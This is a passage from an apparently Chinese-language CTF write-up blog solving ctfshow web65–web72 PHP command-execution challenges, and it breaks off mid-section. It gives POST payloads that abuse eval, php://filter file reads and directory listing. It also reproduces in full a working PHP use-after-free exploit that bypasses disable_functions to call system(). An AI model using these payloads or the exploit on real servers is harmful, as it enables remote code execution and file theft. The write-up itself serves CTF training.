class="line">c=show_source(&#x27;flag.php&#x27;);</span><br><span class="line">c=include$_POST[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><p><code>show_source</code>被<code>ban</code>了，而且<code>flag</code>不在<code>flag.php</code>，需要查看目录找</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=print_r(scandir(&quot;/&quot;));</span><br><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=include$_POST[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=/flag.txt</span><br></pre></td></tr></table></figure><h3 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h3><p><code>print_r</code>被<code>ban</code>了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=var_dump(scandir(&quot;/&quot;));</span><br><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=include$_POST[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=/flag.txt</span><br></pre></td></tr></table></figure><h3 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h3><p>无源码，<code>highlight_file</code>被<code>ban</code>了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=var_dump(scandir(&quot;/&quot;));</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=include$_POST[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=/flag.txt</span><br></pre></td></tr></table></figure><h3 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h3><p><code>var_dump</code>被<code>ban</code>了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=include$_POST[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=/flag.txt</span><br></pre></td></tr></table></figure><blockquote><p>几种查看目录的方法</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&quot;*&quot;</span>)); <span class="comment">// 列当前目录</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&quot;/*&quot;</span>)); <span class="comment">// 列根目录</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">opendir</span>(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=<span class="title function_ invoke__">readdir</span>(<span class="variable">$d</span>)))&#123;<span class="keyword">echo</span><span class="string">&quot;<span class="subst">$f</span>\n&quot;</span>;&#125;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">dir</span>(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==(<span class="variable">$f</span>=<span class="variable">$d</span>-&gt;<span class="title function_ invoke__">read</span>()))&#123;<span class="keyword">echo</span><span class="variable">$f</span>.<span class="string">&quot;\n&quot;</span>;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">glob</span>(<span class="string">&quot;/*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;<span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;   &quot;</span>;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&quot; &quot;</span>);&#125;</span><br></pre></td></tr></table></figure><h3 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h3><p>无源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=include$_POST[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=/flag.txt</span><br></pre></td></tr></table></figure><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>强制退出，不执行后面的命令即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$d=opendir(&quot;/&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;;exit();</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);exit();</span><br></pre></td></tr></table></figure><h3 id="web72"><a href="#web72" class="headerlink" title="*web72"></a>*web72</h3><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>换一个查看目录方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure><p>但是<code>include</code>被<code>ban</code>了，并且有<code>open_basedir</code>和<code>disable_functions</code>的限制，试了试蚁剑也不行了，使用别人的脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>URL</code>编码一下直接打（泻药，我已经看懵了<code>/(ㄒoㄒ)/~~</code>）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span 